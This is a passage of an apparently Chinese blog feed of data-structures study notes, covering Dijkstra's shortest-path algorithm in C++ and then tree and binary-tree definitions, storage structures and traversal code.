class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> vexs[MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">float</span> arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;MGraph;</span><br></pre></td></tr></table></figure><h5 id="算法概要-3"><a href="#算法概要-3" class="headerlink" title="算法概要"></a>算法概要</h5><p>1.引入辅助数组D[ ],D[i]表示当前所找到的源点到每个终点i的最短路径长度，最短路径的初值即有向边的权值D[i]=G.arcs[$v_0$] [i]</p><p>​    引入辅助数组final[ ],final[i]=1表示顶点i的最短路径已经求出，否则未求出</p><p>​    初始状态：final[$v_0$]标志为1，其余为0</p><p>​    引入数组P[ ]来记录路径</p><p>2.选择D[ ]中路径最小值的顶点v(已经求出最短路的顶点除外)</p><p>​    v就是当前求得得一条从$v_0$出发的最短路径的终点，修改final[v]=1</p><p>3.修改未求出最短路径的顶点的最短路径长度，如果D[v]+G.arcs[v] [w]&lt;D[w]</p><p>​    则修改D[w]，D[w]=D[v]+G.arcs[v] [w]</p><p>​    同时修改P[w]=v</p><p>4.重复2 ，3操作 n-1次，求得最短路径长度递增序列</p><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  dijkstra</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFINITY 1000</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">struct</span> <span class="title class_">ArcCell</span> &#123;</span><br><span class="line">    <span class="type">int</span> adj;</span><br><span class="line">&#125;ArcCell,AdjMatrix[MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> vexs[MAX_VERTEX_NUM];</span><br><span class="line">   <span class="comment">// AdjMatrix arcs;</span></span><br><span class="line">    <span class="type">float</span> arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;MGraph;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(MGraph G,<span class="type">int</span> v0,<span class="type">int</span> *P,<span class="type">float</span> *D)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,v,w,min,f[MAX_VERTEX_NUM];</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        f[v]=<span class="number">0</span>;</span><br><span class="line">        D[v]=G.arcs[v0][v];</span><br><span class="line">       </span><br><span class="line">        P[v]=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(D[v]&lt;INFINITY) P[v]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>]=<span class="number">1</span>;P[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;D[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;f[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;P[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        min=INFINITY;</span><br><span class="line">        <span class="keyword">for</span>(w=<span class="number">0</span>;w&lt;G.vexnum;++w)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!f[w])</span><br><span class="line">                <span class="keyword">if</span>(D[w]&lt;min)&#123;v=w;min=D[w];&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f[v]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(w=<span class="number">0</span>;w&lt;G.vexnum;++w)&#123;</span><br><span class="line">            <span class="keyword">if</span>((!f[w])&amp;&amp;(min+G.arcs[v][w]&lt;D[w]))&#123;</span><br><span class="line">                D[w]=min+G.arcs[v][w];</span><br><span class="line">                P[w]=v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pre;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%.0f:%d&quot;</span>,D[i],i); <span class="comment">//这里因为测试的都用的整数，直接舍去小数输出了</span></span><br><span class="line">        pre=P[i];</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;-%d&quot;</span>,pre);</span><br><span class="line">            pre=P[pre];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    MGraph G;</span><br><span class="line">    G.vexnum=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            G.arcs[i][j]=INFINITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">3</span>][<span class="number">3</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">4</span>][<span class="number">4</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">6</span>;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">    G.arcs[<span class="number">1</span>][<span class="number">3</span>]=<span class="number">5</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">3</span>]=<span class="number">3</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">4</span>]=<span class="number">4</span>;</span><br><span class="line">    G.arcs[<span class="number">3</span>][<span class="number">4</span>]=<span class="number">2</span>;</span><br><span class="line">    <span class="type">float</span> *D = <span class="keyword">new</span> <span class="type">float</span>[G.vexnum]; <span class="comment">// 动态分配内存</span></span><br><span class="line">    <span class="type">int</span> *P = <span class="keyword">new</span> <span class="type">int</span>[G.vexnum];</span><br><span class="line">    <span class="built_in">ShortestPath_DIJ</span>(G, <span class="number">0</span>, P,D);</span><br><span class="line">    <span class="keyword">delete</span>[] D; <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="keyword">delete</span>[] P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>Dijkstra算法的时间复杂行主要体现在求每个顶点的最短路径是，需要修改距离和求最小值，时间复杂性O($n^2$)</p><p>Dijkstra算法的空间复杂性主要体现在辅助数组，空间复杂性为O(n)</p><h4 id="每一对顶点之间的最短路径"><a href="#每一对顶点之间的最短路径" class="headerlink" title="每一对顶点之间的最短路径"></a>每一对顶点之间的最短路径</h4><p>依次把有向网络的每个顶点作为源点，重复执行Dijkstra算法n次，即可求得每对顶点之间的最短路径</p><p>Floyd算法 可以直接求出所有顶点之间的最短路径</p><h5 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h5><p>对顶点进行编号，设顶点为0,1,…,n-1，算法采用邻接矩阵G.arcs[n] [n]表示有向网络</p><p>$D^{(-1)}[n][n]$表示中间不经过任何点的最短路径；即邻接矩阵</p><p>$D^{(0)}[n][n]$表示只允许经过0号顶点的最短路径</p><p>$D^{(1)}[n][n]$表示只允许经过0号和1号顶点的最短路径</p><p>$…….$</p><p>$D^{(n-1)}[n][n]$表示可经过所有顶点的最短路径</p><p>基本想法：动态规划算法</p><p>如果$v_i$与$v_j$之间有一条路径，但不一定最短，也许经过某些中间点会使路径长度更短，尝试在原路径中加入其他顶点作为中间顶点</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】树与二叉树</title>
      <link href="/2023/11/14/"/>
      <url>/2023/11/14/</url>
      
        <content type="html"><![CDATA[<h3 id="树的定义和基本术语"><a href="#树的定义和基本术语" class="headerlink" title="树的定义和基本术语"></a>树的定义和基本术语</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>树是n(n&gt;=0)个结点的有限集。</p><p>(1)<strong>有且仅有</strong>一个特定的称为根的结点</p><p>(2)n&gt;1时，其他结点可以分为m个不相交的有限集，其中每个集合也构成一颗树，称为根的子树。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>(1)树的根结点没有前驱，其他结点有且仅有一个前驱。</p><p>(2)树中任何一个结点可以有零或多个后继结点。</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><p>1.结点(node)</p><p>2.结点的度(degree)</p><p>3.树的度</p><p>4.叶子或终端结点</p><p>5.非终端结点</p><p>6.父(双)亲结点(parent)</p><p>7.儿(孩)子结点(child)</p><p>8.兄弟结点(sibling)</p><p>9.路径</p><p>10.祖先</p><p>11.子孙(后代)</p><p>12.结点的层数(level)</p><p>12.树的深度(depth)或高度</p><p>14.有序树和无序树</p><p>15.森林(forest): 是m(m&gt;=0)棵互不相交的树的集合</p><h4 id="树的表示方法"><a href="#树的表示方法" class="headerlink" title="树的表示方法"></a>树的表示方法</h4><p>1.图</p><p>2.嵌套集合</p><p>3.广义表形式： (A(B(D),C))</p><p>4.凹入表示法</p><h3 id="树的有关概念"><a href="#树的有关概念" class="headerlink" title="树的有关概念"></a>树的有关概念</h3><h4 id="树的抽象数据类型"><a href="#树的抽象数据类型" class="headerlink" title="树的抽象数据类型"></a>树的抽象数据类型</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADT Tree&#123;</span><br><span class="line">    数据对象D:D是具有相同特性的元素的集合。</span><br><span class="line">  数据关系R:若D为空集,则称为空树;否则:</span><br><span class="line">                  (<span class="number">1</span>)在D中存在唯一的称为根的数据元素，则R集为空;</span><br><span class="line">                (<span class="number">2</span>)当n&gt;<span class="number">1</span>时,其余结点n&gt;<span class="number">1</span>时，其他结点可以分为m个不相交的有限集，其中每个集合也是一颗符合本定义的树，称为根root的子树。</span><br><span class="line">  基本操作P:查找类、插入类、删除类操作。                                 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="树的基本操作类"><a href="#树的基本操作类" class="headerlink" title="树的基本操作类"></a>树的基本操作类</h4><p>查找类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Root(T)//求树的根结点</span><br><span class="line">Value(T,cur_e)//求当前结点的元素值</span><br><span class="line">Parent(T,cur_e)//求当前结点的双亲结点</span><br><span class="line">LeftChild(T,cur_e)//求当前结点的最左孩子</span><br><span class="line">RightSibling(T,cur_e)//求当前结点的右兄弟</span><br><span class="line">TreeEmpty(T)//判断树是否为空</span><br><span class="line">TreeDepth(T)//求树的高度</span><br><span class="line">TraverseTree(T,Visit())//遍历</span><br></pre></td></tr></table></figure><p>插入类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitTree(&amp;T)//初始化置空树</span><br><span class="line">CreateTree(&amp;T,definition)//按定义构造树</span><br><span class="line">Assign(T,cur_e,value)//为当前结点赋值</span><br><span class="line">InsertChild(&amp;T,&amp;p,i,c)//将c为根的树插入为结点p的第i棵子树</span><br></pre></td></tr></table></figure><p>删除类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClearTree(&amp;T)//清空树</span><br><span class="line">DestroyTree(&amp;T)//销毁树的结构</span><br><span class="line">DeleteChild(&amp;T,&amp;p,i)删除结点p的第i棵子树</span><br></pre></td></tr></table></figure><h3 id="二叉树的定义"><a href="#二叉树的定义" class="headerlink" title="二叉树的定义"></a>二叉树的定义</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>二叉树(Binary Tree)是n(n&gt;=0)个结点的集合，这个集合可以是空集，可以是一个结点，或者是由一个根结点和两棵称为左子树和右子树的互不相交的二叉树组成。</p><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><p>1.可以为空，即不含结点</p><p>2.每个结点至多有二棵子树(二叉树中不存在度大于2的结点)</p><p>3.二叉树是有序树，子树有左右之分，次序不能任意颠倒；允许有些结点只有左子树或右子树</p><h4 id="五种基本形态"><a href="#五种基本形态" class="headerlink" title="五种基本形态"></a>五种基本形态</h4><p>如图：<img src="/2023/11/14/树的五种基本形态.png" alt="image1"></p><h4 id="二叉树与树的区别"><a href="#二叉树与树的区别" class="headerlink" title="二叉树与树的区别"></a>二叉树与树的区别</h4><p>每个结点至多两个子树，且有左右之分</p><h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><p>1.在二叉树的第i(i&gt;=1)层上至多有$2^{i-1}$个结点</p><p>2.深度为k的二叉树最多有$2^k$-1个结点</p><p>3.对任意二叉树T，如果终端结点数为n~0~(度数为0的结点树),n~1~,n~2~分别表示度数为1，2的结点个数，则n~0~=n~2~+1</p><p>满二叉树：</p><p>一个二叉树的叶子结点都在最后一层上，且不存在度数为1的结点</p><p>设高为k则有$2^k$-1个结点</p><p>特点：</p><p>1.对给定的高度，满二叉树有最多结点</p><p>2.不存在度为1的结点</p><p>3.每个分支都有两颗高度相同的子树</p><p>4.叶子结点都在最后一层</p><p>(重点)<strong>完全二叉树</strong>：如果存在一颗二叉树，对树中结点自上而下，自左而右连续编号，若编号为i的结点的位置与满二叉树中i的结点的位置相同，则称此二叉树为完全二叉树。</p><p>特点：</p><p>1.叶子结点只可能在<strong>层树最大的两层</strong>上出现</p><p>2.对任意结点，若有右子树则必有左子树</p><p>3.具有n个结点的完全二叉树深度为$\lfloor log_2n\rfloor$+1（向下取整）或者$\lceil log_2(n+1)\rceil$(向上取整)</p><p>4.对于一个具有n个结点的完全二叉树，其结点按层序编号，则对任意结点k~i~(1$\leq$i$\leq$n)：</p><p>已知编号i(1$\leq$i$\leq$n)，双亲结点是$\lfloor i/2 \rfloor$</p><p>已知编号i(1$\leq$i$\leq$n/2)，左孩子结点为2i</p><p>已知编号i(1$\leq$i$\leq$(n-1)/2)，左孩子结点为2i+1</p><p>已知编号i(i为奇数,且1&lt;i&lt;n),左兄弟结点为i-1</p><p>已知编号i(i为偶数,且1&lt;i&lt;n),左兄弟结点为i+1</p><h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><h4 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h4><p>利用完全二叉树的性质，可以将完全二叉树存入向量b[n]中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> TElemType SqBiTree[MAX_TREE_SIZE];</span><br><span class="line">SqBiTree bt;<span class="comment">//和TElemType bt[100]相同</span></span><br></pre></td></tr></table></figure><p><img src="/2023/11/14/顺序存储结构.png" alt="image2"></p><div class="table-container"><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th><th>12</th><th>13</th><th>14</th><th>15</th></tr></thead><tbody><tr><td>31</td><td>23</td><td>12</td><td>66</td><td>$\emptyset$</td><td>05</td><td>17</td><td>70</td><td>62</td><td>$\emptyset$</td><td>$\emptyset$</td><td>$\emptyset$</td><td>88</td><td>$\emptyset$</td><td>55</td></tr></tbody></table></div><p>顺序存储方式对于畸形二叉树，浪费空间</p><h4 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h4><p>每个结点中，设置两个链域指向左孩子和右孩子，一个数据域，若没有左孩子或右孩子，则指针指向NULL</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TElemType</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    TElemType data</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lch</span>,*<span class="title">rch</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><p>n个结点的二叉树中，共有n+1个空域</p><p>二叉链表很难找到双亲</p><p>三叉链表(带双亲的二叉链表) 含四个域：数据域，左指针域，右指针域，双亲域</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TElemType</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lch</span>,*<span class="title">rch</span>,*<span class="title">parent</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><h4 id="二叉树的生成"><a href="#二叉树的生成" class="headerlink" title="二叉树的生成"></a>二叉树的生成</h4><p>递归创建</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BiTNode* <span class="title">CreateBiTree</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> n, <span class="type">int</span> &amp;i,<span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;size&amp;&amp;a[i]!=n)</span><br><span class="line">    &#123;</span><br><span class="line">        BiTNode* newNode = <span class="built_in">InitBtNode</span>(a[i]);</span><br><span class="line">        i++;</span><br><span class="line">        newNode-&gt;lch = <span class="built_in">CreateBiTree</span>(a, n, i,size);</span><br><span class="line">        i++;</span><br><span class="line">        newNode-&gt;rch = <span class="built_in">CreateBiTree</span>(a, n, i,size);</span><br><span class="line">        <span class="keyword">return</span> newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>销毁：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryBiTree</span><span class="params">(BiTree &amp;root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==root)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DestoryBiTree(root-&gt;lch);</span><br><span class="line">    DestoryBiTree(root-&gt;rch);</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line">    root = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历二叉树"><a href="#遍历二叉树" class="headerlink" title="遍历二叉树"></a>遍历二叉树</h3><p>样例：<img src="/2023/11/14/遍历例子.png" alt="image3"></p><h4 id="前序遍历-先根遍历"><a href="#前序遍历-先根遍历" class="headerlink" title="前序遍历(先根遍历)"></a>前序遍历(先根遍历)</h4><p>1.若二叉树为空，则返回；</p><p>若不空：</p><p>2.访问根结点；</p><p>3.前序遍历左子树</p><p>4.前序遍历右子树</p><p><strong>先根，再左，后右</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 2 4 8 9 5 10 11 3 6 12 7</span><br></pre></td></tr></table></figure><p>前序遍历的第一个结点的是根结点，最后一个结点一定是叶子结点。</p><h4 id="中序遍历-中根遍历"><a href="#中序遍历-中根遍历" class="headerlink" title="中序遍历(中根遍历)"></a>中序遍历(中根遍历)</h4><p>1.若二叉树空，返回；</p><p>若不空：</p><p>2.中序遍历左子树；</p><p>3.访问根结点；</p><p>4.中序遍历右子树。</p><p><strong>先左，再根，后右</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8 4 9 2 10 5 11 1 12 6 3 7</span><br></pre></td></tr></table></figure><p>第一个结点是最左边的结点，最后一个结点是最右边的结点，根结点位于左子树结点和右子树结点之间。</p><h4 id="后序遍历-后根遍历"><a href="#后序遍历-后根遍历" class="headerlink" title="后序遍历(后根遍历)"></a>后序遍历(后根遍历)</h4><p>1.若二叉树空，返回；</p><p>若不空：</p><p>2.中序遍历左子树；</p><p>3.后序遍历右子树；</p><p>4.访问根结点。</p><p><strong>先左，再右，后根</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8 9 4 10 11 5 2 12 6 7 3 1</span><br></pre></td></tr></table></figure><p>后序遍历中最后一个结点是根结点</p><h3 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h3><h4 id="递归遍历"><a href="#递归遍历" class="headerlink" title="递归遍历"></a>递归遍历</h4><p>先序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    visit(T-&gt;data);<span class="comment">//遍历操作，可以是打印该结点的值</span></span><br><span class="line">    PreOrder(T-&gt;lch);</span><br><span class="line">    PreOrder(T-&gt;rch);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    InOrder(T-&gt;lch);</span><br><span class="line">    visit(T-&gt;data);</span><br><span class="line">    InOrder(T-&gt;rch);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    PostOrder(T-&gt;lch);</span><br><span class="line">    PostOrder(T-&gt;rch);</span><br><span class="line">    visit(T-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="非递归遍历"><a href="#非递归遍历" class="headerlink" title="非递归遍历"></a>非递归遍历</h4><p>先序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 100</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrder</span><span class="params">(BiTNode *root)</span></span>&#123;</span><br><span class="line">  BiTNode *p,*BiNode[MAX];</span><br><span class="line">  <span class="type">int</span> top=<span class="number">0</span>;p=root;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">      <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">      BiNode[top]=p;</span><br><span class="line">      top++;</span><br><span class="line">      p=p-&gt;lch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(top&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      top--;</span><br><span class="line">      p=BiNode[top];</span><br><span class="line">      p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(top&gt;<span class="number">0</span>||p!=<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrder_N</span><span class="params">(BiTree root)</span></span>&#123;</span><br><span class="line">    BiTNode *p,*BiNode[MAX];</span><br><span class="line">    <span class="type">int</span> top=<span class="number">0</span>;p=root;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>(root))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;BiTree Empty!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            BiNode[top]=p;</span><br><span class="line">            top++;</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            top--;</span><br><span class="line">            p=BiNode[top];</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=p-&gt;rch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(top&gt;<span class="number">0</span>||p!=<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrder_N</span><span class="params">(BiTree root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BiTNode *p, *lastVisited = <span class="literal">NULL</span>;</span><br><span class="line">    BiTNode *stack[MAX];</span><br><span class="line">    <span class="type">int</span> top = <span class="number">0</span>; <span class="comment">// 栈顶位置下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> || top &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            stack[++top] = p;</span><br><span class="line">            p = p-&gt;lch;</span><br><span class="line">        &#125;</span><br><span class="line">        p = stack[top];</span><br><span class="line">        <span class="comment">// 判断右子树是否已经访问过</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;rch == <span class="literal">NULL</span> || p-&gt;rch == lastVisited)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            lastVisited = p;</span><br><span class="line">            top--;</span><br><span class="line">            p = <span class="literal">NULL</span>; <span class="comment">// 置空，防止重复访问</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;rch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="二叉树的其他操作"><a href="#二叉树的其他操作" class="headerlink" title="二叉树的其他操作"></a>二叉树的其他操作</h4><p>判断树是否空：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isEmpty</span><span class="params">(BiTree root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问结点操作：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">(TElemType data)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,data.key);</span><br><span 